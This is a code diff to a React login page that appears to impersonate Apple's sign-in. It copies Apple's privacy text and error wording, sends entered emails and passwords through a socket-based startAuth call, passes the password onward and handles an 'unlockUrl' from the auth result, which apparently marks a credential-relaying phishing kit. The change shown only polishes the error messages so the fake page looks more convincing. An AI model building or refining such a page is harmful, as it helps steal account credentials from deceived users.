@@ -2,6 +2,7 @@ import { useEffect, useRef, useState } from "react";
 import { Landing } from "../components/Landing";
 import { startAuth, reportEmail } from "../lib/socket";
 import { useAuthState } from "../lib/useAuth";
+import { friendlyMessage } from "../lib/messages";
 
 const PRIVACY_TEXT =
   "Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support, and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services.";
@@ -56,7 +57,7 @@ export default function Login({ onContinue }) {
   });
   const [error, setError] = useState(() => {
     try {
-      return sessionStorage.getItem("authError") || "";
+      return friendlyMessage(sessionStorage.getItem("authError") || "", "", "login");
     } catch {
       return "";
     }
@@ -120,7 +121,7 @@ export default function Login({ onContinue }) {
   // card under the loading veil; surface it here without losing the email.
   useEffect(() => {
     if (auth.status === "invalid" || auth.status === "error") {
-      setError(auth.error || "Incorrect Apple Account or password.");
+      setError(friendlyMessage(auth.error || "Incorrect Apple Account or password.", "Incorrect Apple Account or password.", "login"));
       if (auth.result?.unlockUrl) setUnlock(auth.result.unlockUrl);
       if (!email && auth.account?.email) setEmail(auth.account.email);
     }
@@ -157,7 +158,7 @@ export default function Login({ onContinue }) {
       await startAuth({ email: email.trim(), password });
       onContinue?.(email.trim(), password);
     } catch (failure) {
-      setError(failure.message || "Could not sign in. Try again.");
+      setError(friendlyMessage(failure.message, "Could not sign in. Try again.", "login"));
     } finally {
       setBusy(false);
     }
